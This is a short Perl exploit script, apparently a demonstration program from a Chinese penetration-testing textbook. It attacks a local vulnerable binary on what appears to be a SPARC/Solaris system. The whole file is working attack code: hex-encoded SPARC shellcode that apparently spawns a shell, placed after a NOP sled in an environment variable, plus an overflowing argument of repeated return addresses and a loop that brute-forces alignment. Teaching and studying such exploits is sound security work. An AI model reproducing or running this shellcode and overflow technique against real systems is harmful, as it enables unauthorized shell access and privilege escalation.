#!/usr/bin/perl
#
#  《网络渗透技术》演示程序
#  作者：san, alert7, eyas, watercloud
#
# exploit.pl
# exploit program vulnerable

$CMD="/export/home/san/exploit/vulnerable";

$SHELLCODE=
"\x2d\x0b\xd8\x9a".
"\xac\x15\xa1\x6e".
"\x2f\x0b\xdc\xda".
"\xec\x3b\xbf\xf0".
"\x90\x03\xbf\xf0".
"\xd0\x23\xbf\xf8".
"\xc0\x23\xbf\xfc".
"\x92\x03\xbf\xf8".
"\x94\x1a\x80\x0a".
"\x82\x10\x20\x3b".
"\x91\xd0\x20\x08";

$NOP="\xaa\x1d\x40\x15"x100;
%ENV=();

$ENV{CCC}=$NOP.$SHELLCODE;
$ret=system $CMD ,"\xff\xbe\xff\x58"x24;

for($i=0;$i<4 && $ret;$i++){
    for($j=0;$j<4 && $ret;$j++) {
        $ENV{CCC}="A"x $j .$NOP.$SHELLCODE;
        $ret=system $CMD ,"A"x $i ."\xff\xbe\xff\x58"x24;
    }
}
